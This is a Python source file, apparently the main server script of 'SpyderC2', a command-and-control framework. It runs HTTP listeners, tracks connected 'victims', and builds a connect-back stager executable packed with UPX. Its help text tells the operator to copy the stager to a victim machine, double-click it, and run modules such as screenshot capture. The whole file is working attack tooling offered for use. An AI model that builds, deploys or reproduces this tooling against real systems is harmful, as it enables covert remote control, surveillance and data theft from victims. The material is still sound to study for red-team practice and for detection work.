
import pdb
import pymongo
import re
import os
import shutil
import subprocess
import argparse
from lib.logger import Logger
from termcolor import colored
import datetime
import pathlib
import signal
import socket
import traceback

## Provides command history like bash to input
import readline

## Full path of the current script
PATH = os.path.dirname(os.path.realpath(__file__))

def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	parser.add_argument('-d', '--detached', help = "Doesn't automatically launch logs in another screen.", action='store_true')
	parser.add_argument('-c', '--clear-db', help = "Clears database when exiting / error occurs", action='store_true')
	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args


def display_ascii_art():
	f = open(os.path.join(PATH,'ascii_art'),'r')
	print(''.join([line for line in f]))

def display_main_help_menu():
	print()
	print(' --------------------------------------')
	print('|          SERVER HELP MENU            |')
	print(' --------------------------------------')
	commands = {'http':'Starts a new http listener.' , 'listeners': 'List existing http listener running.', 'kill_listeners': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}

	for command in commands.keys():
		print(colored(command,'cyan') + " - " + commands[command])

## Checks if we are running on docker container
def docker():
	return os.path.isfile('/.dockerenv')

def get_victim_os():
	while True:
		print(colored("Enter OS of victim - windows/linux",'cyan'))
		os_name = str(input())
		os_name = os_name.lower()
		if os_name in ['windows','linux']:
			return os_name
		elif os_name in ['back','exit']:
			return False
		else:
			print(colored("Sorry not supported os",'yellow'))
			continue

## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
def fill_server_url():
	print(colored("Enter listener IP",'cyan'))
	server_ip = str(input())

	while True:
		print(colored("Enter listener port. Default is 8080",'cyan'))
		server_port = str(input())
		if server_port == '':
			server_port = '8080'
			break
		elif not server_port.isdigit():
			print("Please enter Port in integer")
		else:
			break

	stager_path = os.path.join(PATH,'stager.py')

	stager_content = open(stager_path,'r').read()
	stager_content = stager_content.replace("##SERVER_URL##",f"{server_ip}:{server_port}")

	new_stager_path = os.path.join(PATH,'shared','tmp','stager.py')

	f = open(new_stager_path,'w+')
	print(stager_content,file=f)
	f.close()

def print_help_text():
	print(f"""
To test this framework :

1. First run a listener, by running {colored('http','cyan')}. Check in the logs if the listener is started successfully.
2. Then you would want to generate a payload/stager , by running {colored('generate','cyan')} command. Enter your {colored('host IP','cyan')} address when server URL is asked as this is where the victim will contact. If you are running on your host machine, stager will be generated automatically , but  {colored('if running on docker, you would get a help text','cyan')} to generate the stager.
3. Then {colored('copy','cyan')} this stager.exe to the victim machine.
4. Double click the stager.exe on the victim. You should see a new victim with an ID in logs.
5. Check the vicitm list using {colored('victims','cyan')} command.
6. To interact with victim, run {colored('use <victim_id>','cyan')}
7. Now you are in victim help menu. Run {colored('modules','cyan')} to see the stuff you can run on the victim machine.
8. To run a module, {colored('use <module_name>','cyan')} , ex : use screenshot
9. You can then modify the arguments available for that module, Ex , you can set the path where screenhsot will be saved on the attacker/host machine, using 'set path /home'
10. Now to run this module on victim, hit {colored('run','cyan')}
11. {colored('Check in the logs','cyan')}, you will see the script/task being issue to the victim, and logs will also show where the output/screenshot is being stored.

		""")

def check_file_existence(path,file):
	if not os.path.isfile(os.path.join(path,file)):
		server_logger.info_log(f"{file} doesn't exist at {path}. Please look for the file and copy in appropriate place.")
		return False
	else:
		return True


def delete_folder_contents(folder,server_logger):
	for filename in os.listdir(folder):
		file_path = os.path.join(folder, filename)
		try:
			if os.path.isfile(file_path) or os.path.islink(file_path):
				os.unlink(file_path)
			elif os.path.isdir(file_path):
				shutil.rmtree(file_path)
		except Exception as e:
			server_logger.info_log(f"Failed to delete {file_path}. Reason: {e}",'yellow')

			## Probably the current user doesn't have the privilege to remove files from tmp
			try:
				cmd  = f'sudo rm -r {folder}/*'
				server_logger.info_log(f"\nAttempting to run {colored(cmd,'yellow')}")
				subprocess.check_output(cmd,shell=True)
				return True
			except Exception as e:
				server_logger.info_log(f"\nPlease clear the tmp directory manually and try again.",'red')
				return False

	return True


def pack_exe(server_logger,exe_path,packer_path):
	server_logger.info_log('Packing the created executable...')
	if not os.path.isfile(exe_path):
		server_logger.info_log(f'Executable not present at {exe_path}','yellow')
		return False

	if not os.path.isfile(packer_path):
		server_logger.info_log(f'Packer binary not present at {packer_path}','yellow')
		return False

	try:
		cmd  = f'{packer_path} {exe_path}'
		server_logger.info_log(f"\nAttempting to run {colored(cmd,'cyan')}")
		subprocess.check_output(cmd,shell=True)
		return True
	except Exception as e:
		server_logger.info_log(e,'red')
		return False



def generate_stager(server_logger):
	
	os_name = get_victim_os()

	if not os_name:
		return

	## Convert to exe and save
	if os.path.exists(os.path.join(PATH,'shared','tmp')):
		if not delete_folder_contents(os.path.join(PATH,'shared','tmp'),server_logger): return
	else:
		os.mkdir(os.path.join(PATH,'shared','tmp'))


	## Check for src files to copy
	if not check_file_existence(PATH,'stager.spec'): return
	if not check_file_existence(PATH,'requirements.txt'): return

	## We fill in the User Provided server URL in tne stager.py and move it to tmp
	fill_server_url()

	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return

	## Copy files.
	shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'shared','tmp','stager.spec'))
	shutil.copyfile(os.path.join(PATH,'requirements.txt'),os.path.join(PATH,'shared','tmp','requirements.txt'))

	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.spec')): return
	if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return


	## We will attempt to pack the exe
	exe_path = os.path.join(PATH,'shared','tmp','dist',os_name,'stager.exe')
	packer_path = os.path.join(PATH,'utilities','upx','upx')
	
	try:
		if not docker():
			server_logger.info_log("Generating stager.. Please wait, this might take some time...")
			subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)

			if pack_exe(server_logger,exe_path,packer_path):
				server_logger.info_log('Sucessfully Packed exe','green')
			else:
				server_logger.info_log("Couldn't pack exe",'yellow')



			print(colored(f"\nexe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
		else:
			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + 'sudo ../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
	except subprocess.CalledProcessError as grepexc:                                                                                                   
		print(colored(f"exe generation failed ","red"))


## Attempts to kill process running on a port
def kill_process_on_port(port):
	try:
		process = subprocess.Popen(["lsof", "-i", ":{0}".format(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		stdout, stderr = process.communicate()
		for process in str(stdout.decode("utf-8")).split("\n")[1:]:       
		    data = [x for x in process.split(" ") if x != '']
		    if (len(data) <= 1):
		        continue

		    os.kill(int(data[1]), signal.SIGKILL)

		return True

	except Exception as e:
		print(colored(e,'yellow'))
		return False

def main(args,db_object,server_logger):
	myclient = db_object.mongoclient

	display_main_help_menu()
	print()

	while True:
		cmd = str(input(colored("(SpyderC2:) > ",'red')))

		if cmd == 'http':

			while True:
				print(colored("\nEnter Listening Port. Default is 8080",'cyan'))
				if docker(): print(colored('Please note , for docker the range of usable port is 8080-8100 due to increased startup times for forwarding. if you need more, adjust in the docker-compose.yml'))
				port = str(input())

				if port == '':
					port='8080'
					break
				elif not port.isdigit():
					print("Please enter Port in integer")
				else:
					break

			obj = Listener.listener_exists(port)

			if not obj:
				## Listener object doesn't already exists for that port
				obj = Listener(port=port)
			
			ret = obj.start_listener()

			if ret:
				server_logger.info_log("\nStarted http listener.",'green')
			else:
				server_logger.info_log("\nFailed to start http listener. Something is running on that port.",'yellow')

				## Attempts to kill the process running on that port
				## killing with lsof doesn't work in docker
				if not docker():
					print(colored("Do you want to kill the process running on that port? Enter y or yes to do so.",'cyan'))
					ans = str(input())

					if ans.lower() in ['y','yes']:
						if kill_process_on_port(port):
							server_logger.info_log("Successfully killed the process on that port. Try running the listener again.",'green')
						else:
							server_logger.info_log("Couldn't kill the process on that port. Try running sudo \"ss -lp 'sport = :<port>'\" and get the process Id and kill it by - \" sudo kill <pid>\"",'yellow')


		elif cmd == 'listeners':
			Listener.show_listeners()

		elif cmd == 'kill_listeners':
			Listener.kill_all_listeners()


		elif cmd == 'generate':
			generate_stager(server_logger)
			

		elif cmd == 'victims':
			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
			Victim.load_victims_from_db()
			Victim.show_victims()

		## Matching use LKF0599NMU
		elif re.match(r'^use [\w\d]{1,10}$',cmd):

			Victim.load_victims_from_db()
			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]

			## Supporting Regex to quickly interact with part of ID.
			r = re.compile(victim_id+".*")
			matched = list(filter(r.match, Victim.victims.keys()))

			if len(matched) == 0 :
				server_logger.info_log("No victims found with that ID",'yellow')
			elif len(matched) == 1 :
				victim_id = matched[0]
				server_logger.info_log(f"Interacting with {victim_id}",'green')
				Victim.victims[victim_id].victim_menu()
			else:
				server_logger.info_log("Multiple victims found, Please provide full or unique ID.",'yellow')


		elif cmd == 'help':
			display_main_help_menu()

		elif cmd == 'exit':
			Listener.kill_all_listeners()
			if args.clear_db : db_object.drop_db()
			break
		elif cmd == '':
			print()
			pass
		else:
			print(f"Not supported. Type {colored('help','cyan')} to see commands supported.")

		print()

def get_db_info(server_logger):
	if 'MONGODB_USERNAME' not in os.environ: 
		print(colored("Enter mongodb username if any",'blue'))
		os.environ['MONGODB_USERNAME'] = str(input())

	if 'MONGODB_PASSWORD' not in os.environ: 
		print(colored("Enter mongodb password if any",'blue'))
		os.environ['MONGODB_PASSWORD'] = str(input())

	if 'MONGODB_HOSTNAME' not in os.environ: 
		os.environ['MONGODB_HOSTNAME'] = '127.0.0.1'

	if 'MONGODB_DATABASE' not in os.environ: 
		os.environ['MONGODB_DATABASE'] = 'SpyderC2'

	server_logger.info_log(f"You can set these environment variables - {colored('MONGODB_USERNAME , MONGODB_PASSWORD , MONGODB_HOSTNAME , MONGODB_DATABASE','cyan')}",'blue')

	db_url = "mongodb://"
	if os.environ['MONGODB_USERNAME'] != '' and os.environ['MONGODB_PASSWORD'] != '':
		db_url += f"{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@"
		
	db_url += f"{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"

	return db_url


if __name__=="__main__":
	args = parser()
	display_ascii_art()


	## Setting up logging
	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
	server_logger.setup()

	
	## launches the log in new screen
	server_logger.launch_logs_screen(args)
	

	if docker(): server_logger.info_log(f"Please launch the server by running - {colored('sudo docker exec -it spyderc2_server python3 /home/attacker/SpyderC2/main.py','cyan')} ")
	

	db_url = get_db_info(server_logger)
	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
	from lib.listener import Listener
	from lib.database import Database
	from lib.task import Task
	from lib.victim import Victim

	print_help_text()

	db_object = Database(url=db_url)
	Listener.mongoclient = db_object.mongoclient
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient


	## The shared path will be the volume shared b/w host and docker
	if not os.path.exists(os.path.join(PATH,'shared')):
		os.mkdir(os.path.join(PATH,'shared'))

	try:
		if db_object.db_data_exists():
			db_object.load_db_data()

		main(args,db_object,server_logger)
	except:

		## TODO - also mark all the victims dead ? Same during exit
		server_logger.info_log(traceback.format_exc(),'red')
		Listener.kill_all_listeners()
		if args.clear_db : db_object.drop_db()